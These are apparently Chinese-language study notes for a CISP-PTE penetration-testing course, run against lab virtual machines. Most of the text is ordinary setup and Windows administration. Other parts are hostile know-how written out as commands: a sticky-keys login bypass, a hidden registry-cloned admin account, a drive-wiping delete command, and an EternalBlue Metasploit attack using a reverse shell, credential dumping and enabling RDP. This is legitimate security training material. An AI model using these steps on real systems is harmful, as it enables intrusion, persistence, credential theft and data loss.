---

title: CISP-PTE
date: 2025-08-17 11:12:01
categories: 安全
top: 95
tags: cisp
---


# 培训

## 第一天 开班准备

### 学习寄语

```
# 班主任：大麦老师；助教老师：陈老师；培训对接老师：魏老师
# 王老师
学习：勤学多练，要理解不要背，有的放矢，有问题尽量当天解决，
要求1：（C）当前老师上课的实操要全部跟着操作完；（B）课后要熟练上课的实操内容；（A）做到举一反三
要求2：当天作业尽量当天交，考勤要注意
# 张老师（第一阶段教学）
课程：系统（Windows&Linux），网络，开发
# 肖老师（第二阶段教学）
课程：
# 叶老师（第三阶段教学）
课程：安全产品、安全服务，等保测评，安全加固，应急响应流程，防火墙，WAF，态势感知，堡垒机，企业如何使用安全产品保护IT资产，
# 上课制度
课程时长：学习四个月（3-4阶段考核）
上课时间：周一到周五，上午9:00-12:00，下午14:00-18:00，晚上18:00-22:00（自习时间）
# 韩老师-就业老师
岗位，未来规划
# 小白老师-学习方法
雷锋精神：无私奉献（开源），坚持，有底线
多向老师请教，
# 陈老师-助教老师
看完要多练习，根据理解去学习，可以加上自己的理解去做
# 大麦班主任-学习方法
多学多问，
```

###  资料下载 

```
镜像：
工具：

```

### 环境准备

Windows非家庭版安装&激活

VMware安装&配置

VPN工具安装&配置

FTP工具安装&配置

## 第二天 桌面虚拟环境

### Windows7

```bash
# VM16pro，安装系统2C4G60G，删除打印机，工作网络，稍后提示，mz/aa
Windows7 企业版
# 安装VM Tools工具的补丁
windows6.1-kb4474419-v3-x64_b5614c6cea5cb4e198717789633dca16308ef79c.msu
# 禁用 Windows update
services.msc
启动类型：禁用；恢复：无操作
# 关闭 配置自动更新
gpedit.msc
管理模版 > Windows组件 > Windows Uupdate >> 配置自动更新 （已禁用）
# 关闭防火墙
控制面板\系统和安全\Windows 防火墙\自定义设置
# 压缩出一个D盘30G左右
# 克隆多一台WIn7虚拟机，并修改主机名mz-PC2
```

### WinServer2019

```bash
# 桌面体验版，30G系统盘，aA1234
D潘
# 桌面优化
图标
# VMTools
安装 VMTools
# 关闭防火墙
控制面板\系统和安全\Windows 防火墙\自定义设置
# 关闭更新
gpedit.msc
管理模版 > Windows组件 > Windows Uupdate >> 配置自动更新 （已禁用）
# 无须按 Ctrl + Alt + Del交互式登录
gpedit.msc > Windows设置 > 安全设置 > 本地策略 > 安全选项 > 交互式登陆：无须按Ctrl + Alt + Del （已启用）
# 快照

# 克隆&修改主机名
```

###  VM网络模式

```
桥接
NAT
仅主机模式
```


### Dos命令

```bash
### help = command /?

# 修改字体颜色
color 0a

## dir
# 查看当前目录文件
dir
# 只显示名字
dir /w
# 显示当前目录和子目录的所以文件
dir /s
# 显示当前目录和子目录的所以文件 / 翻页
dis /s/p
# 查看隐藏文件
dir /a
# 模糊查询, ?代表一个单词
dir de?ktop
# 模糊查询2，*代表多个单词
dir d*
# 模糊查询3，空格需要要""包裹
dir "desk top"

## cd
# 进入目录, cd [.|..|path]
cd path
# 返回盘符目录，即根目录
cd /
# 直接跨盘符调整指定目录            --todo     在D盘如何直接跨盘调整到C指定目录--
cd /d [盘符]

## md 创建目录
# 创建单层目录
md test
# 创建多层目录
md a/b/c

## cd> 创建文件
# 创建aa.txt文件
cd> aa.txt
# 在a路径下创建aa.txt文件
cd> a\aa.txt

## echo 编写内容
# 往aa.txt文件覆盖写入内容whoami
echo whoami > aa.txt
# 往aa.txt文件追加写入内容whoami
echo whoami >> aa.txt
# 往a目录下的aa.txt文件覆盖写入内容whoami
echo whoami > a\aa.txt

## type 查看文件内容
# 查看aa.txt文件内容
type aa.txt

## copy 复制文件
# 将aa.txt文件拷贝到test目录中
copy aa.txt test
# 拷贝test目录下的aa.txt文件到根目录并修改为bb.txt文件
copy test\aa.txt bb.txt

## ren 修改文件名称
# 将 bb.txt 修改为 cc.txt
ren bb.txt cc.txt
# 将test目录下的aa.txt 修改为bb.txt [后面不需要指定目录]
ren test\aa.txt bb.txt

## rd 删除目录
# 删除 test目录[需要确认]
rd /s test
# 确定删除test目录
rd /s/q test

## del 删除文件
# 删除 aa.txt 文件
del aa.txt

### 其他
## cls 清屏
## ver 查看当前dos版本
## chkdsk 检查当前磁盘，chkdsk d: 检查D盘
## time 显示时间
## date 显示日期
## certmgr 证书管理窗口
## mstsc 打开远程窗口
## explorer 文件管理器
## calc 计时器工具
## cleanmgr 磁盘清理工具
## gpedit 本地组策略编辑器
## lusrmgr 本地用户和组
## notepad 打开记事本
## regedit 注册表
## sfc 检查文件， sfc /SCANNOW 
## taskmgr 任务管理器
## write 写字板
## help 查看有什么命令

## ipconfig 查看IP地址
ipconfig
ipconfig /all

## nslookup 查看DNS解析
nslookup baidu.com

## ping 默认ping 4次
ping baidu.com -t # 一直ping
ping baidu.com -n 10 # ping 10 次
ping baidu.com -l 1464 # 指定ping包大小为10字节 [有些网站现在ping包大小]
```

### [cisp-practise01](https://hjxstart.github.io/2025/08/21/cisp-practice01/)



## 第三天 Windows :file_folder:


```
Windowe系统格式：CDFS/UDF/FAT12/FAT16/FAT32/NTFS
NTFS (New Technology File System 新技术文件系统)
```

### 权限

```
默认继承权限；可以通过禁用继承，修改权限和主体；
aa/bb: 如果aa禁用了继承，并修改权限；bb没有禁用继承，则bb会继承aa的权限；
cc/dd：如果dd禁用了继承，并修改权限；cc没有禁用继承，dd的权限保持不变；
```

### 用户 


```bash
# Win7密码保存地址：C:\Windows\System32\config\SAM；hash加密了
0、账号的编号
Administrator	500
Guest	501

1、查看用户
whoami /user # 查看当前用户
vmic useraccount get name,sid # 查看所以账号的名称和sid
net user  # 查看所有用户
net user admin # 查看admin用户信息

2、启用或禁用指定用户
net user admin /active:yes # 启用admin用户
net user admin /active:no #  禁用admin用户

3、命令创建用户
net user mz aa123456 /add  # 创建用户mz 密码为aa123456

4、命令重置用户密码
net user mz "" # 将mz用户密码重置为空

5、修改用户密码
net user mz 123456 # 将mz用户的密码修改为123456

6、命令删除用户
net user mz /del # 删除mz用户
```

### 组

```bash
# 组：Guest、Users
1、查看组
net localgroup # 查看本地用户组
2、命令创建组
net localgroup group1 /add # 创建group1组
3、命令删除组
net localgroup group1 /del # 删除group1组
4、命令添加用户到指定组
net localgroup group1 mz /add # 将用户mz加入group1组
5、把指定用户踢出组
net localgroup group1 mz /del # 将用户mz移出group1组
```

### 5次shift漏洞

```bash
# 唤醒程序路径：C:\Windows\System32\sethc
# 复现方法：先关机重启，看到windows图标，直接在VM上关闭客户机（模拟开机时断断电源操作），再重启虚拟机，一定要看到“启动启动修复（推荐）”，回车；取消还原，查看“隐藏问题详细信息”，打开“X:\windows\system32\zh-CN\erofflps.txt”，在记事本中文件>打开，文件类型选择所有文件，将sethc修改为sethce，将cmd复制一份并修改为sethc，之后关闭窗口点击完成关机，再开机，点击用户登陆，按5次shift按键，在CMD窗口执行net user username ""，设置无密码即可登录。

```

![sethc](https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250823114649243.png)

![5次shift漏洞](https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250823114952907.png)

### 安全策略

```
gpedit.msc > Windows设置 > 账号策略 > 密码策略 （密码长度，复杂性，默认（密码最长使用时间42天，最短0天），强制密码历史次数）
gpedit.msc > Windows设置 > 账号策略 > 账号锁定策略 （锁定时间，锁定阈值：3次无效登录，重置锁定计数器）
# 本地日志 （使用事件查看器，eventvwr.msc）
gpedit.msc > Windows设置 > 本地策略 （登录记录，系统时间等）
```

### Windows隐藏账号

```bash
net user test$ aa /add # 创建一个test$用户
net localgroup administrators test$ /add # 添加到administrators 组中
net user administrator /active:yes # 激活administrator账号
# 在本地用户和组中删除test$
regedit # 打开注册表
1、打开HKEY_LOCAL_MACHINE/SAM/SAM，右键“权限”，将administrators组更新完成控制权限，刷新注册表（查看，刷新）；
2、继续打开HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Users/Names
3、导出administrator的uuid注册表到桌面，Users/000001F4命名为admini_uuid
4、导出test$的uuid注册表到桌面，Users/000003E9命名为test_uuid
5、导出test$的name注册表到桌面，Users/Names/test$命名为test
6、编辑admini_uuid，拷贝F值到test_uuid的导出注册表中
7、命令删除test$用户：net user test$ /del，刷新检查注册表和本地用户中都没有test$用户了
8、导入test$注册表：先右键test的注册表选择合并，在右键test_uuid的注册表选择合并，刷新检查注册表有test的账号信息了
9、设置“不显示登录用户名登录”：gpedit.msc > Windows设置 > 安全设置 > 本地策略 > 安全选项 > "交互式登录：不显示最后的用户名"

```

### [cisp-practise02](https://hjxstart.github.io/2025/08/22/cisp-practice02/)

### [cisp-practise03](https://hjxstart.github.io/2025/08/23/cisp-practice03/)



##  第四天 Linux





---

# 其他


### Win7

```bash
# 删除C盘的全部文件
del *.* /s/q
```

### Kali
```bash
# 设置中文
sudo dpkg-reconfigure locales

# 修改root密码
sudo -i
password root

## root用户视图下，更换kali源仓库为国内
cd /etc/apt
cp sources.list sources.list.bak
# 阿里源
deb https://mirrors.aliyun.com/kali kali-rolling main non-free contrib
deb-src https://mirrors.aliyun.com/kali kali-rolling main non-free contrib
# apt更新
apt update # 没有公钥解决方法：sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys ED65462EC8D5E4C5

## 实用工具
# 检测主机是否存在
fping -asg 192.168.112.0/24 -C 1

## nmap  网络探测和安全审核
# nmap 192.168.112.128
135/tcp   open  msrpc # RPC远程调用
139/tcp   open  netbios-ssn # 文件共享
445/tcp   open  microsoft-ds # 永恒之蓝
3389/tcp  open  ms-wbt-server # 远程桌面端口
5357/tcp  open  wsdapi # 非常高危的端口
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
# nmap -sV 192.168.112.128

# nmap -p 1-65535 192.168.112.128

# nmap -p- 192.168.112.128
```

### 永恒之蓝 MS17-010

```bash
sudo nmap -sS -p 445 192.168.112.0/24 > p_445

cat p_445 | grep -E "Nmap|open"

# 
msfconsole
  search ms17_010
  use auxiliary/scanner/smb/smb_ms17_010
  use exploit/windows/smb/ms17_010_eternalblue\
    set rhost 192.168.112.128 # 设置靶机
    set lhost 192.168.112.130 # 设置本机IP
    set payload windows/x64/meterpreter/reverse_tcp
    run # 开始攻击

## 攻击成功后的操作
screenshot # 截图
screenshare # 实时监控屏幕
# 查看密码
hashdump
load kiwi
ps -S "csrss"
migrate 344
creds_all
shell # 登陆到win7
chcp 65001 # 消除乱码
wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1 # 远程
netstat -an # 查看端口
sudo rdesktop 192.168.112.128 # 发起远程
```

### SQL注入--CVE-2022-32991漏洞复现

```bash

```